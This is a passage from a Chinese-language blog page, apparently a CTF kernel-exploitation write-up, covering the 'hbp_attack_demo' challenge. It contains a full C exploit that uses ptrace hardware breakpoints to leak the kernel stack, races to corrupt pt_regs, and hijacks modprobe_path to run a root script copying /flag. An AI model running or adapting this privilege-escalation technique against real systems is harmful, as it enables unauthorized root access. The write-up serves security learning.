ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待子进程退出</span></span><br><span class="line">    waitpid(pid,&amp;status,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6666</span>,<span class="number">0xfffffe0000010f58</span>);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="hbp-attack-demo"><a href="#hbp-attack-demo" class="headerlink" title="hbp_attack_demo"></a>hbp_attack_demo</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>驱动就是一个无限制的任意写.利用就是之前所说,子进程1不断uname触发断点并查看是否泄露出内核栈,子进程2不断修改内核栈上的pt_regs.获取到内核地址后写modprobe_path读取flag.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405091747322.png"></p>
+<p>在exc_debug函数下断点,查看rdi指向的空间,即为0xA8大小的pt_regs结构.<br>这里注意数据断点是会断在触发断点的那条访存指令的后一条指令,所以此时已经完成了8字节的一次拷贝.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405091453242.png"></p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">size_t</span>* aligin_buf;</span><br><span class="line"><span class="type">int</span> sync_pipe[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">ARG</span></span></span><br><span class="line"><span class="class">    {</span></span><br><span class="line">        <span class="type">uint64_t</span> addr_;</span><br><span class="line">        <span class="type">uint64_t</span> val_;</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ARG</span> <span class="title">arg</span> =</span> {.addr_=addr,.val_=val};</span><br><span class="line">    </span><br><span class="line">    ioctl(dev_fd,<span class="number">0</span>,&amp;arg);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// hexdump(aligin_buf,0x400);</span></span><br><span class="line">    <span class="comment">// HEX("aligin_buf",aligin_buf[51]);</span></span><br><span class="line">    <span class="keyword">if</span>(((aligin_buf[<span class="number">51</span>]&amp;<span class="number">0xfff</span>)==<span class="number">0xb32</span>) &amp;&amp; (aligin_buf[<span class="number">51</span>]&gt;<span class="number">0xffffffff81000000</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="type">size_t</span> canary = aligin_buf[<span class="number">47</span>];</span><br><span class="line">        kernel_base = aligin_buf[<span class="number">51</span>]<span class="number">-0xe0b32</span>;</span><br><span class="line">        logi(<span class="string">"got kernel_base"</span>);</span><br><span class="line">        write(sync_pipe[<span class="number">1</span>],&amp;kernel_base,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_kstack</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    logd(<span class="string">"leak_kstack init"</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    raise(SIGSTOP);</span><br><span class="line"></span><br><span class="line">    logd(<span class="string">"leak_kstack start"</span>);</span><br><span class="line"></span><br><span class="line">    aligin_buf = buf+<span class="number">0xE</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        uname(buf);       </span><br><span class="line">        check(); </span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev_fd = open(<span class="string">"/dev/vuln"</span>,O_RDWR))&lt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        err_exit(<span class="string">"open device"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid1,pid2;</span><br><span class="line"></span><br><span class="line">    pipe(sync_pipe);</span><br><span class="line">    <span class="keyword">if</span>((pid1 = fork())==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        close(sync_pipe[<span class="number">0</span>]);</span><br><span class="line">        leak_kstack();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    close(sync_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待child1暂停</span></span><br><span class="line">    waitpid(pid1,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    create_hbp(pid1,buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//条件竞争写regs.rcx</span></span><br><span class="line">    <span class="keyword">if</span>((pid2 = fork())==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        bind_core(<span class="number">1</span>);</span><br><span class="line">        logd(<span class="string">"Trigger start"</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            arb_write(<span class="number">0xfffffe0000010fb0</span>,<span class="number">0x400</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_CONT,pid1,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//阻塞,等待子进程获取kernel_base;</span></span><br><span class="line">    read(sync_pipe[<span class="number">0</span>],&amp;kernel_base,<span class="number">8</span>);</span><br><span class="line">    logd(<span class="string">"Parent received kernel_base"</span>);</span><br><span class="line">    HEX(<span class="string">"kernel_base"</span>,kernel_base);</span><br><span class="line">    kill(pid2,SIGKILL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    logd(<span class="string">"modify modprobe_path"</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_path = kernel_base+<span class="number">0x01e8b920</span>;</span><br><span class="line">    arb_write(modprobe_path,u64(<span class="string">"/copy\0\0\0"</span>));</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /Pwned\n/bin/chmod 777 /Pwned' &gt; /copy"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /copy"</span>);</span><br><span class="line">    system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /dummy"</span>);</span><br><span class="line">    system(<span class="string">"chmod +x /dummy"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/dummy"</span>);</span><br><span class="line"></span><br><span class="line">    logi(<span class="string">"Pwned by HanQi..."</span>);</span><br><span class="line">    system(<span class="string">"cat /Pwned"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405091744343.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61670993/article/details/134980555">https://blog.csdn.net/qq_61670993/article/details/134980555</a><br><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html">https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/ret2hbp/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/CVE-2022-0847%20DirtyPipe/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            内核审计笔记 pipe.c, splice.c &amp;&amp; CVE-2022-0847 DirtyPipe分析
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/AliyunCTF2024%20Exploit%20Netatalk%20v3.1.12%20by%20CVE-2022-23121/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">AliyunCTF2024 Netatalk v3.1.12 越界读写利用</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
